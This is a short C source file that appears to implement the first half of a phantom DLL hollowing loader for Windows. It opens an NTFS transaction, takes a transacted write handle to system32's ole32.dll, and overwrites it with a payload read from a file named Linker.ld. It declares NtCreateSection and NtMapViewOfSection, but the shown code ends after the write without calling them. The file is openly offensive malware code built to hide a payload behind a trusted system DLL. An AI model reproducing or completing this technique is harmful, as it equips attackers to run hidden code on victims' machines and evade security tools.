#include <windows.h>
#include <ktmw32.h>
#include <stdio.h>

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PCUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef const OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

EXTERN_C NTSYSCALLAPI NTSTATUS NTAPI NtCreateSection( 
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes,
    _In_opt_ HANDLE FileHandle
);

typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

EXTERN_C NTSYSCALLAPI NTSTATUS NTAPI NtMapViewOfSection(
    _In_ HANDLE SectionHandle,
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*ViewSize) _Writable_bytes_(*ViewSize) _Post_readable_byte_size_(*ViewSize)) PVOID *BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _In_ SIZE_T CommitSize,
    _Inout_opt_ PLARGE_INTEGER SectionOffset,
    _Inout_ PSIZE_T ViewSize,
    _In_ SECTION_INHERIT InheritDisposition,
    _In_ ULONG AllocationType,
    _In_ ULONG PageProtection
);

int WinMain(
    HINSTANCE hInstance, 
    HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, 
    int nShowCmd
) {
    BYTE* PayloadBuffer = nullptr;
    ULONG Payloadsize   = 0;

    HANDLE TxfObject   = CreateTransaction( 0, 0, 0, 0, 0, 0, 0 );
    HANDLE PayloadFile = CreateFileA( "Linker.ld", GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
    if ( PayloadFile == INVALID_HANDLE_VALUE ) {
        printf("failed to open payload file handle: %d\n", GetLastError()); return 1;
    }   
    HANDLE FileTxf = CreateFileTransactedA( 
        "c:\\windows\\system32\\ole32.dll", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr, TxfObject, 0, nullptr 
    );
    if ( FileTxf == INVALID_HANDLE_VALUE ) {
        printf("failed to open txf handle to dll: %d\n", GetLastError()); return 1;
    }

    puts("opened txf object, file txf and payload file");

    Payloadsize = GetFileSize( PayloadFile, 0 );
    PayloadBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), 8, Payloadsize);
    DWORD TmpValue = 0;
    if ( ! ReadFile( PayloadFile, (PVOID)PayloadBuffer, Payloadsize, &TmpValue, nullptr ) ) {
        printf("failed to read payload file: %d\n", GetLastError()); return 1;
    }

    puts("writting payload file in target txf");

    if ( ! WriteFile( FileTxf, PayloadBuffer, Payloadsize, nullptr, nullptr ) ) {
        printf("failed to write payload file in txf: %d\n", GetLastError()); return 1;
    }

    puts("payload written");

    
}
 
